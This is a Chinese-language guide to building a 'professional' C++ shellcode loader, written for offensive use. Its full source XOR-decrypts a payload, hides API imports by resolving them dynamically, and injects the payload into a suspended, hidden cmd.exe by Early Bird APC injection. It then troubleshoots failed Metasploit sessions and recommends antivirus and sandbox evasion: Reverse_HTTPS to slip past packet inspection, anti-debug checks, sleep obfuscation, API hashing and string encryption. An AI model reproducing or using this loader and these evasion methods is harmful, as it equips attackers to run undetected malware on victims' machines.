# Professional C++ Shellcode Loader

## 1. 核心改进策略 (C vs C++)

* **IAT 隐藏**: 不再直接调用 `VirtualAllocEx`，通过函数指针动态获取 API 地址，对抗静态扫描工具（如 Strings, PEID）。
* **命名空间与类封装**: 提高代码模块化，便于集成复杂的反沙箱逻辑。
* **强类型校验**: 减少指针偏移带来的内存崩溃问题。

---

## 2. C++ 生产级实现 (Loader.cpp)

```cpp
#include <windows.h>
#include <iostream>
#include <vector>

// 定义函数原型，用于动态寻址避开 IAT 检查
typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

class PayloadLoader {
private:
    std::vector<unsigned char> shellcode;
    unsigned char xor_key;
    void Decrypt() {
        for (auto &byte : shellcode) {
            byte ^= xor_key;
        }
    }

public:
    PayloadLoader(unsigned char* data, size_t size, unsigned char key) 
        : shellcode(data, data + size), xor_key(key) {}

    bool Execute() {
        Decrypt();
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        // 动态获取内核函数地址
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        pVirtualAllocEx _VirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
        pWriteProcessMemory _WriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");

        // 1. 创建傀儡进程
        if (!CreateProcessA(NULL, (LPSTR)"cmd.exe /c", NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            return false;
        }

        // 2. 远程内存分配
        LPVOID remote_buffer = _VirtualAllocEx(pi.hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        // 3. 写入并修改保护属性
        _WriteProcessMemory(pi.hProcess, remote_buffer, shellcode.data(), shellcode.size(), NULL);
        
        DWORD oldProtect;
        VirtualProtectEx(pi.hProcess, remote_buffer, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);

        // 4. Early Bird APC 注入
        QueueUserAPC((PAPCFUNC)remote_buffer, pi.hThread, 0);
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }
};

int main() {
    // 示例加密数据 (XOR 0xCC)
    unsigned char raw_payload[] = { 0xab, 0x8d, 0x12... }; 
    PayloadLoader loader(raw_payload, sizeof(raw_payload), 0xCC);
    
    if (loader.Execute()) {
        // 执行成功
    }
    return 0;
}

```

---

## 3. 常见报错及技术解决方案

### A. 注入进程立即崩溃 (Access Violation)

* **原因**: Shellcode 位数与目标进程位数不匹配（例如：64位 Loader 注入 32位 `cmd.exe`）。
* **方案**:
1. 确保 `msfvenom` 使用 `windows/x64/...`。
2. 将项目配置设置为 `x64` 平台而非 `Any CPU` 或 `x86`。

### B. CreateProcessA 返回错误代码 5 (Access Denied)

* **原因**: 试图注入受系统保护的进程（如 `lsass.exe`）或目标路径不存在。
* **方案**:
1. 确保 Loader 以管理员权限运行。
2. 将目标进程更换为普通应用路径，如 `C:\Windows\System32\notepad.exe`。

### C. GetProcAddress 返回 NULL

* **原因**: 模块名称或函数名拼写错误（注意区分 `A` 和 `W` 后缀，如 `CreateProcessA`）。
* **方案**: 使用混淆后的字符串动态解密函数名，或使用散列算法（API Hashing）匹配函数地址。

### D. Shellcode 运行后无 Session 回连

* **原因**:
1. 杀软检测到 `QueueUserAPC` 异常行为并拦截。
2. 网络防火墙阻断出口流量。

* **方案**:
1. 增加 **Sandbox Check**（检查 CPU 核心数、内存大小或运行时间）。
2. 使用 **HTTPS (Reverse_HTTPS)** 协议绕过 DPI 深度包检测。

---

## 4. 工业级优化建议

* **Anti-Debug**: 在入口处加入 `IsDebuggerPresent()` 校验。
* **Sleep Obfuscation**: 在执行前增加一段复杂的数学计算或 `MsgWaitForMultipleObjects`，延长加载时间以绕过内存沙箱扫描。
* **String Encryption**: 使用 `constexpr` 在编译期对所有字符串（如 "kernel32.dll"）进行加密，使其在二进制文件中不可见。
